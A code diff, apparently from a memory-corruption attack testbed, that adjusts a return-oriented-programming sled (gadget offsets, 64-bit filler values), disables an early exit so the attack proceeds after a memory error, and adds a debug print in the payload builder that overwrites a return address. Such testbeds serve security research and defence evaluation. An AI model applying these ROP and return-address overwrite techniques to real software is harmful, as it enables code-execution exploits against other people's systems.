@@ -111,7 +111,7 @@ static boolean has_opened_output_stream = FALSE;
 static ATTACK_FORM attack;
 static char loose_change2[128];			//NN Sandwich the control vars
 
-static int rop_sled[7] = {0,0xFFFFFFFF,0,0,0xFFFFFFFF,0,0};
+static long int rop_sled[7] = {0,0xFFFFFFFF,0,0,0xFFFFFFFF,0,0};
 
 int fooz(char *a, int b){
 	int zz,ff;
@@ -146,10 +146,12 @@ int main(int argc, char **argv) {
    */
   fake_esp_jmpbuff[12] = &exit;
   fake_esp_jmpbuff[13] = &cf_ret_param;
-  rop_sled[0] = &gadget1 + 62;
-  rop_sled[2] = &gadget2 + 62;
+  rop_sled[0] = &gadget1 + 59;
+  rop_sled[1] = 0xFFFFFFFFFFFFFFFF;
+  rop_sled[2] = &gadget2 + 59;
   rop_sled[3] = &cf_ret_param;
-  rop_sled[5] = &gadget3 + 62;
+  rop_sled[4] = 0xFFFFFFFFFFFFFFFF;
+  rop_sled[5] = &gadget3 + 59;
   rop_sled[6] = &exit;
 
   for(i=0; i < 512; i++){
@@ -936,8 +938,9 @@ void perform_attack(FILE *output_stream,
 
   /*
    * gjd: do not bother to attempt the attack after the memory error.
+   * colton: let's give it a go
    */
-  do_exit();
+  // do_exit();
 
   /*******************************************/
   /* Ensure that code pointer is overwritten */
@@ -1413,6 +1416,8 @@ boolean build_payload(CHARPAYLOAD *payload) {
     	free(payload->buffer);
     	// Set the new payload buffer
    	 payload->buffer = temp_char_buffer;
+
+     fprintf(stderr, "rop_sled[0] = %p\n", rop_sled[0]);
 
       //Overwriting Return address with address of gadget1  
       memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
